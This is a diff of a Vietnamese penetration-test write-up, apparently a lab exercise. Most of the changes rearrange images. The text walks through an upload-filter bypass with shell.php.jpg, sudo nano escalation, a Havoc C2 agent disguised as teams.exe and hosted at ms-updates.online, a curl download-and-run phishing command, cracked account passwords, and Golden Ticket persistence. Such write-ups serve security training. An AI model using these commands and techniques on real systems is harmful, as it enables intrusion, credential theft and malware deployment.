@@ -44,19 +44,19 @@ Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được 
     <img src="/Images/Picture3-1.png" width="45%" />
 </p>
 
-
-
 Tiến hành scandir xem có thư mục nào ẩn không ta tìm được một vài directory ẩn: `/robots.txt`,`/admin`.
 
 ![](/Images/Picture4.png)
 
-Ta tìm được một trang web cho phép upload ảnh online.Tấn công upload: Trang upload chỉ cho phép .jpg. 
-
-![](/Images/Picture5.png)
-
-![](/Images/Picture6.png)
-
+Ta tìm được một trang web cho phép upload ảnh online.Tấn công upload: Trang upload chỉ cho phép .jpg.
 Tuy nhiên, bypass bằng cách tải lên shell.php.jpg và chiếm quyền Web Server.
+
+
+<p align="center">
+    <img src="/Images/Picture5.png" width="45%" />
+    <img src="/Images/Picture6.png" width="45%" />
+</p>
+
 
 ![](/Images/Picture7.png)
 
@@ -74,8 +74,10 @@ User này được cấu hình chạy nano với sudo vì vậy ta dễ dàng l�
 
 ![](/Images/Picture10.png)
 ![](/Images/Picture10-3.png)
-![](/Images/Picture10-1.png)
-![](/Images/Picture10-2.png)
+<p align="center">
+    <img src="/Images/Picture10-1.png" width="45%" />
+    <img src="/Images/Picture10-2.png" width="45%" />
+</p>
 
 Ta đăng nhập qua ssh sử dụng credential của ip `12.3.3.10`.
 
@@ -101,8 +103,10 @@ Tiếp theo ta sẽ sử dụng Havoc Framework để cắm agent vào máy `cli
 Chúng ta sẽ tạo một agent tên là teams.exe và gửi nó qua cho máy darlene bằng cách host một server có domain ms-updates.online chứa file này, sau đó kích hoạt để HavocClient hiển thị các thông tin của máy này, bao gồm cả shell, thư mục, đường dẫn, ...
 
 ![](/Images/Picture13-2.png)
-![](/Images/Picture13-3.png)
-![](/Images/Picture13-4.png)
+<p align="center">
+    <img src="/Images/Picture13-3.png" width="45%" />
+    <img src="/Images/Picture13-4.png" width="45%" />
+</p>
 
 Vậy là ta đã thành công cắm C2 Server vào máy `client1`. Ta cần phải thêm file `teams.exe` này vào startup của máy để khi máy được khởi động, HavocCilent sẽ tự động kết nối. Chúng ta sẽ cd vào đường dẫn sau và tải file agent về, khi đó mục startup của máy sẽ có tiến trình agent này, khi máy khởi động thì tiến trình này sẽ tự động kích hoạt. Path: `C:\Users\clent1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.
 
@@ -130,13 +134,14 @@ Sau đó, vận chuyển payload `updates-ms.exe` vừa tạo thông qua shell c
 
 ![](/Images/Picture16.png)
 
+![](/Images/Picture16-2.png)
+
 Sử dụng công cụ hash decryptor online, ta tìm được các account như sau:
 ```
 admin:Matkhaucu@	
 vantruong:P@ssword@
 dangtrung:WinClient123
 ```
-![](/Images/Picture16-2.png)
 
 RDP từng user ta tìm được list email của nhân viên trong document.
 
@@ -155,9 +160,10 @@ Script: ``` curl ms-updates.online/updates.exe -o updates.exe & updates.exe ```
 
 Giả sử user 'client2' đã tải về. Khi user này mở ra và bấm vào file, script sẽ được chạy, tải file agent có tên `updates.exe` về máy và tự khởi chạy.
 
-![](/Images/Picture19.png)
-
-![](/Images/Picture19-1.png)
+<p align="center">
+    <img src="/Images/Picture19.png" width="45%" />
+    <img src="/Images/Picture19-1.png" width="45%" />
+</p>
 
 ![](/Images/Picture19-2.png)
 
@@ -182,13 +188,17 @@ Ta thử sử dụng credential này bằng rdp.
 
 Sau đó ta sẽ tạo backdoor và Tạo Golden Ticket để duy trì quyền truy cập lâu dài.
 
-![](/Images/Picture23.png)
+<p align="center">
+    <img src="/Images/Picture23.png" width="45%" />
+    <img src="/Images/Picture23-2.png" width="45%" />
+</p>
 
-![](/Images/Picture23-2.png)
 
-![](/Images/Picture24.png)
+<p align="center">
+    <img src="/Images/Picture24.png" width="45%" />
+    <img src="/Images/Picture24-1.png" width="45%" />
+</p>
 
-![](/Images/Picture24-1.png)
 
 ![](/Images/Picture25.png)
 
